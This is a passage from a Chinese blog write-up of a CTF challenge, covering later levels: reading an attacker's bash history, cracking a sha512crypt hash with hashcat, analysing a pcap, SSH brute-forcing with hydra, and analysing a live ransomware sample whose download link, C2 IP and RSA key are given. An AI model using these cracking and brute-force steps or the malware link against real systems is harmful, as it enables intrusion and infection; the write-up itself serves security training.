 cat authorized_keys </span><br><span class="line">  113  rm authorized_keys </span><br><span class="line">  114  ls</span><br><span class="line">  115  rm authorized_keys </span><br><span class="line">  116  <span class="built_in">cd</span> ..</span><br><span class="line">  117  <span class="built_in">cd</span> </span><br><span class="line">  118  useradd <span class="built_in">test</span></span><br><span class="line">  119  useradd guest</span><br><span class="line">  120  useradd admin</span><br><span class="line">  121  useradd redis</span><br><span class="line">  122  passwd <span class="built_in">test</span></span><br><span class="line">  123  passwd guest</span><br><span class="line">  124  passwd admin</span><br><span class="line">  125  mkdir /home/admin/.ssh/</span><br><span class="line">  126  mkdir /home/<span class="built_in">test</span>/.ssh/</span><br><span class="line">  127  mkdir /home/guest/.ssh/</span><br><span class="line">  128  ls</span><br><span class="line">  129  <span class="built_in">cd</span> /home/</span><br><span class="line">  130  ls -L 1 </span><br><span class="line">  131  ls </span><br><span class="line">  132  <span class="built_in">cd</span> admin/</span><br><span class="line">  133  ls</span><br><span class="line">  134  ls -al</span><br><span class="line">  135  <span class="built_in">cd</span> ..</span><br><span class="line">  136  ls</span><br><span class="line">  137  <span class="built_in">cd</span> .</span><br><span class="line">  138  <span class="built_in">cd</span> </span><br><span class="line">  139  wget https://cowtransfer.com/s/84d80d0d7b3c45</span><br><span class="line">  140  wget https://static.cowtransfer.com/84d80d0d-7b3c-4539-932d-30c3f0869538/%E9%AB%98%E9%A2%91%E5%AD%97%E5%85%B8.zip?e=1537629504&amp;token=rkrC3sADAVnBtSQ_YTQgxi-3TEVapbu6rxmtmg0v:IDeOMk2XNjOwrk-mcTr6wnRjM84=&amp;sign=484933f3a024bcab2d8f29c659aa8aa9&amp;t=5ba65d40&amp;attname=%E9%AB%98%E9%A2%91%E5%AD%97%E5%85%B8.zip</span><br><span class="line">  141  netstat -tunlp</span><br><span class="line">  142  <span class="built_in">history</span> &gt; /tmp/<span class="built_in">history</span></span><br><span class="line">  143  <span class="built_in">cd</span> /tmp/</span><br><span class="line">  144  vim <span class="built_in">history</span> </span><br><span class="line">  145  <span class="built_in">exit</span></span><br><span class="line">  146  passwd <span class="built_in">test</span></span><br><span class="line">  147  passwd admin</span><br><span class="line">  148  passwd gue</span><br><span class="line">  149  passwd guest</span><br><span class="line">  150  <span class="built_in">history</span> &gt; /tmp/<span class="built_in">history</span></span><br></pre></td></tr></table></figure>
+<p><code>em~</code>，我以为我找到答案了，你肯定也看到了<code>P@ssword123</code>，想多了，因为下面的命令告诉我们，大佬改了密码。</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537707044424.png" alt="1537707044424"></p>
+<p>先再看看<code>/etc/shadow</code>,<code>en~</code>，密码的<code>hash</code>值都有，不是说<code>key 的明文密码就是下一关通关密语</code>吗？那试试爆破<code>key</code>用户的<code>hash</code>值咯。结果再爆破这里，巨坑，有两种工具可以爆破，一种<code>john</code>，一种<code>hashcat</code>，<code>john</code>不知啥原因，<code>kali</code>、<code>ubuntu</code>下均报错，折腾许久，还是没弄好，就去搞鼓<code>hashcat</code>。</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537707242063.png" alt="1537707242063"></p>
+<p><code>hashcat</code>用的是<code>windows</code>版的，但是死活爆破不出来，这是我使用的是<code>john</code>的自带字典<code>rockyou.txt</code>，后面一直换字典，还是爆不出来。厚着脸皮去问出题大佬，大佬给了点提示，仔细看<code>history</code>文件，看了半天，还是没看出啥来，大佬看不下去了，字典在里面。哦~，于是我懂了。上面的<code>history</code>文件有这两条记录</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537707972635.png" alt="1537707972635"></p>
+<p>打开<code>https://cowtransfer.com/s/84d80d0d7b3c45</code>，提示了</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537708058489.png" alt="1537708058489"></p>
+<p>而<code>140</code>行的<code>url</code>经过<code>URLdecode</code>后是这样的<code>https://static.cowtransfer.com/84d80d0d-7b3c-4539-932d-30c3f0869538/高频字典.zip?e=1537629504&amp;token=rkrC3sADAVnBtSQ_YTQgxi-3TEVapbu6rxmtmg0v:IDeOMk2XNjOwrk-mcTr6wnRjM84=&amp;sign=484933f3a024bcab2d8f29c659aa8aa9&amp;t=5ba65d40&amp;attname=高频字典.zip</code>更是提醒我们要用这个字典去跑<code>key</code>的<code>hash</code>值，之前我也有看到这个，还打开过，但是觉得很莫名其妙，听到大佬的提示，突然悟了。是我太菜了，<code>orz</code>。</p>
+<p>于是下载<code>高频字典.zip</code>，然后开始爆破，破破破，不知道怎么破请看<a href="https://blog.csdn.net/mydriverc2/article/details/41384853" target="_blank" rel="noopener">Hash破解神器：Hashcat的简单使用</a>，构造以下命令:</p>
+<p><code>hashcat64.exe -m 1800 -a 0 -o found.txt crack.hash 字典.txt</code></p>
+<p>简单描述下这条命令的意思：如果<code>hashcat</code>在<code>字典.txt</code>中跑出的hash值与<code>crack.hash</code>中所求内容相同，就将<code>字典.txt</code>找到的对应值写入<code>found.txt</code>中。</p>
+<p>于是找啊找，跑啊跑，发现跑完刚刚下载的所有<code>高频字典.zip</code>里的文件还是没找到啊，于是自己本地建了个<code>key</code>用户测试了下，发现可以跑出来啊。感觉出题大佬被我坑了（之前直接的<code>rsdis</code>命令写入，把<code>/etc/passwd</code>写坏了），后面问了下，果然，之前的那条<code>key</code>的<code>hash</code>值是跑不出来的。额。。。自作自受啊。出题老哥后面重新给了个<code>sha512</code>的值<code>$6$ZkfV4HlR$7hk5IVzAVIq1gGLJo254qMm9LT6YrnUy7iATOTc8das8pOwGPWzKMlWTczMjp5fAyYFQ1SMe/K.FIGBAX/0590</code></p>
+<p>执行命令：<code>hashcat64.exe -m 1800 -a 0 -o found.txt crack.hash 55泄漏门（部分）.txt</code>，秒破</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537704976981.png" alt="1537704976981"></p>
+<p>查看<code>found</code>文件：</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537709086328.png" alt="1537709086328"></p>
+<p>第三关最终的<code>KEY</code>：<code>1314woaini1314</code></p>
+<p>听说后面这题是这样的，觉得难度就应该降低挺多的了</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537710176564.png" alt="1537710176564"></p>
+<h4 id="Level-4"><a href="#Level-4" class="headerlink" title="Level_4"></a>Level_4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恭喜完成第三关，第四关的入口是：</span><br><span class="line"></span><br><span class="line">http://zuohaoyingjixiangyinghennan.xazlsec.com</span><br><span class="line"></span><br><span class="line">获得 key 之后，通过后台发送 key 将获得第五关的入口信息，祝你好运！</span><br></pre></td></tr></table></figure>
+<p>打开网页是这样的（我刚做这题的时候，页面是没有任何消息的，摸索好一阵子）</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537746165267.png" alt="1537746165267"></p>
+<p>打开网址<code>https://cowtransfer.com/s/023ab1f54dd04c</code>，提供了一个压缩包<code>HellWorld.pcapng</code>进行下载。</p>
+<p><code>wireshark</code>三板斧试下，很快就会发现其中的<code>http</code>流存在提示，有个压缩包，里面有私钥和公钥文件。除此之外明确，攻击者内网<code>ip：10.0.3.111</code>，被攻击<code>ip：173.82.235.146</code>（攻击者的外网<code>ip</code>：<code>182.150.21.33</code>，估计出题老哥这题是在虚拟机抓的，所以会有内外网ip）</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537978806267.png" alt="1537978806267"></p>
+<p>而分组<code>10061</code>和<code>10956</code>则分析出以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://dynupdate.noip.com/settings.php?username=C3A37087469&amp;pass=HMAC&#123;yuyvphyx4snkqvtgt7kiyiamtra=&#125;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;noip_host_list email=&quot;C3A37087469&quot; enhanced=&quot;false&quot; webserver=&quot;&quot;&gt;</span><br><span class="line">  &lt;domain name=&quot;ddns.net&quot; type=&quot;free&quot;&gt;</span><br><span class="line">    &lt;host name=&quot;cherishao&quot; group=&quot;&quot; wildcard=&quot;false&quot;/&gt;</span><br><span class="line">  &lt;/domain&gt;</span><br><span class="line">&lt;/noip_host_list&gt;</span><br><span class="line"></span><br><span class="line">http://dynupdate.noip.com/ducupdate.php?username=C3A37087469&amp;h[]=cherishao.ddns.net&amp;ip=182.150.21.33&amp;pass=HMAC&#123;qq6tthdbubqfp7d+t0wrgo6pykg=&#125;</span><br></pre></td></tr></table></figure>
+<p>其中有个<code>username=C3A37087469</code>，这个是接下来的线索。另外，值得一提的是<code>passwd.jpg</code>这个图片，这个<code>http</code>传输载体<code>tcp</code>传输时，存在丢包现象，所以单纯的<code>http</code>流追踪是找不到回应的包，只能通过追踪<code>tcp</code>流查找重传的数据。</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537979013881.png" alt="1537979013881"></p>
+<p>很明显，是个图片，不过是<code>base64</code>格式，这个需要自行通过<code>html</code>标签<code>img</code>使图片显示在网页中，操作一番，如下</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537979226469.png" alt="1537979226469"></p>
+<p>好的，我们现在得到了<code>*mGX3Y-d</code>。再仔细看看题目还有个神秘代码，<code>UJxgqdNUuH2I5EDDXgXvhFleJiVxeOvZBLXiLJ3lTq+lTRg7eSMR4++CZwe2z7vFh5CqETYeoZ7fAUWT4iCMMuap2iG/OfbKV2JN2SFrpCKCmSfnlxKIF02KTUyI99Ip/06LtNlmAIBtWisi0Ijr67lq+2HKQgxu5KaaNQpzohk=</code></p>
+<p>这个通过之前压缩包中的<code>rsa</code>私钥文件直接解密，会得到以下内容<code>eK8}vD3=</code>。</p>
+<p>好的做到这里，我有话要讲，那个时候，再看了下题目</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537979709788.png" alt="1537979709788"></p>
+<p>再联系上面得到的消息，我用<code>ubuntu</code>的<code>ssh</code>服务尝试爆破了<code>207.148.27.120</code>的<code>22</code>端口，其中爆破字典我选择了<code>top</code>前<code>100</code>的弱密码，并且添加了<code>*mGX3Y-deK8}vD3=</code>、<code>eK8}vD3=*mGX3Y-d</code>这两个密码进去，但是爆破没结果。而真相是，过了一天，我用<code>xshell</code>再次连接时，直接<code>root</code>用户，再以<code>eK8}vD3=*mGX3Y-d</code>登进去了，登进去了。（这里之前问了出题老哥，老哥说设置了<code>ssh</code>验证次数为<code>5</code>次，猜测是不是这个原因导致<code>ubuntu</code>的<code>hydra</code>没有成功爆破）</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537882454775.png" alt="1537882454775"></p>
+<p>密码是<code>eK8}vD3=*mGX3Y-d</code></p>
+<p>登录成功后，第一件事就是查看<code>history</code>，还是发现了一些东西，比如说<code>icmpsh_m.py</code>，刚开始以为这个是<code>linux</code>提权的后门，理直气壮去找老哥，老哥说不是这个。好吧继续找。</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537884117551.png" alt="1537884117551"></p>
+<p>然后往下翻翻看到了这个</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537980328352.png" alt="1537980328352"></p>
+<p>有个很明显的目录<code>/etc/ssh/</code>，下载了个<code>XAZLER.exe</code></p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537978124473.png" alt="1537978124473"></p>
+<p>打开后是这样的</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537980446285.png" alt="1537980446285"></p>
+<p>细心的你们一定发现，上面有提示“请按任意键继续”，嗯，但是我没按，直接关掉了（那个时候我只要多按下任意一个键，<code>key</code>就会出来）。然后我又继续往下探索，发现了存在一个<code>C3A37087469</code>的用户，咦！</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537886964567.png" alt="1537886964567"></p>
+<p>其中有个<code>key.sh</code>，打开看下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#@Cherishao </span><br><span class="line"></span><br><span class="line">echo “Good job!!&quot;</span><br><span class="line"></span><br><span class="line">:) Congratulations, you have come here. </span><br><span class="line"></span><br><span class="line">   However, you need a higher level of permissions！！！</span><br><span class="line"></span><br><span class="line">   It is said that higher privilege passwords are more complicated(16bit).</span><br></pre></td></tr></table></figure>
+<p>到这里，想了好久还是没思路，厚着脸皮去问出题老哥，发了一些解题截图过去，老哥说：“你是不是傻啊，再随便按个键啊”，然后就是下面这个样子（<code>tm</code>内心一万匹草泥马飞奔）</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537886544690.png" alt="1537886544690"></p>
+<p>好吧，得到了<code>key</code>，下一关的钥匙。</p>
+<p>在其中的解题过程中，此题的出题老哥，教了我好些应急响应、溯源等知识，贼喜欢。</p>
+<p>这里放个学习链接：<a href="https://www.leiphone.com/news/201706/oCidY2C8IPHt82mF.html" target="_blank" rel="noopener">干货 | 黑客入侵？这里有详细的应急排查手册！</a></p>
+<p>解题过程中，老哥为了加快我们的解题速度，还放出了个提示：</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537887293053.png" alt="1537887293053"></p>
+<p>后面做完题，感觉这提示没啥用啊。后面问了下</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537981121231.png" alt="1537981121231"></p>
+<p>好吧，的确有这样的想法，当时我记得<code>ip</code>反查都试了一遍。</p>
+<h4 id="Level-5"><a href="#Level-5" class="headerlink" title="Level_5"></a>Level_5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">恭喜完成第四关，第五关是一个病毒分析题，样本下载地址：</span><br><span class="line"></span><br><span class="line">https://pan.baidu.com/s/1mngKICMpg4nSekfBp0qpPw        密码：fbox</span><br><span class="line"></span><br><span class="line">本题有两个问题：</span><br><span class="line"></span><br><span class="line">1：RSA公钥是什么？</span><br><span class="line"></span><br><span class="line">2: 黑客服务器的IP地址是什么？</span><br></pre></td></tr></table></figure>
+<p>这题啊，大家解压压缩包的时候千万小心，这是个真的病毒，嗯~，还好我放在虚拟机里了，不然，物理机得遭殃。</p>
+<p>看到了题目，想了想，有点意思啊，还问<code>黑客服务器的IP地址是什么？</code>。玩玩呗，虚拟机运行下这个病毒软件，发现文件数据被加密了，还发现了这个</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537981472145.png" alt="1537981472145"></p>
+<p>然后我就去下载<code>onion</code>浏览器了，弄了半天没弄好，去问出题老哥，我觉得那个时候老哥都被我逗笑了。</p>
+<p>然后老哥给了提示，抓包，这个其实也想到了，但是想归想到，操作起来发现巨坑，因为病毒传送信息的服务器炸了，导致抓包的时候没有看到<code>http</code>流，后面仔细看了半天，才找到下图的线索。</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537954753559.png" alt="1537954753559"></p>
+<p>是的，黑客服务器的IP地址就是<code>137.74.163.43</code>，就是这么简单。但是让我头疼的是第一个问题，<code>rsa</code>的公钥是啥？我滴个天啊，摆明要逆向啊。去问问出题老哥有没其他做法，老哥指点了一条明路：<strong>内存提串</strong>，后面使用了<code>火绒剑</code>，这个工具，贼好用。仔细分析了很久，火绒剑监控一下，就能看到这个病毒<code>exe</code>相应的行为了，在其运行完毕后，最终还会释放一个<code>PE</code>，而这个<code>PE</code>是没有任何混淆的，可以清晰使用<code>IDA</code>查看到其中的<code>RSA</code>公钥。当然其中需要<code>dump</code>一下，这里请教了下出题老哥：<strong><code>OD</code>本身能<code>dump</code>，<code>PEtoolS</code>，<code>loadPE</code>也都能dump。</strong>好吧，那就<code>dump</code>一下，<code>dump</code>出来后，直接扔到<code>IDA</code>中，得到<code>RSA</code>公钥</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537963593632.png" alt="1537963593632"></p>
+<p>得到的最后<code>RSA</code>公钥为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyvXYYjSQqu7nWxB8HH/9SIaTd ZZ5Es9nv2KQnPcUV6F0ZHITClTZvoa7PbtG77q76xBNdvTH8VIXGjn+d58xK8jlE krC/N87iWPpG0jgmeY/ytR/gyArojmDFFnt11WP2koi2sjWzz1UXv8SC/aHHqfHe wgWrhFLmlhxrBxo46wIDAQAB -----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+<p>黑客服务器<code>ip：137.74.163.43</code></p>
+<p>这里有个尴尬的地方，因为我是先拿到<code>ip</code>，提交答案后，直接“完成所有挑战”，后面跟出题老哥反映下，再继续去找公钥的答案。</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537978300052.png" alt="1537978300052"></p>
+<p>到此结束，大佬们，再见。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/24/2018中秋节随记/" rel="next" title="2018中秋节随记">
+                <i class="fa fa-chevron-left"></i> 2018中秋节随记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/17/小白无线网络测试初探/" rel="prev" title="无线网络安全测试初探">
+                无线网络安全测试初探 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/person_image.jpg"
+                alt="jianghuxia" />
+            
+              <p class="site-author-name" itemprop="name">jianghuxia</p>
+              <p class="site-description motion-element" itemprop="description">Stay Hungry. Stay Foolish.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-1"><span class="nav-number">1.</span> <span class="nav-text">Level_1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-2"><span class="nav-number">2.</span> <span class="nav-text">Level_2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-3"><span class="nav-number">3.</span> <span class="nav-text">Level_3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-4"><span class="nav-number">4.</span> <span class="nav-text">Level_4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-5"><span class="nav-number">5.</span> <span class="nav-text">Level_5</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">jianghuxia</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":160},"mobile":{"show":true}});</script></body>
+</html>
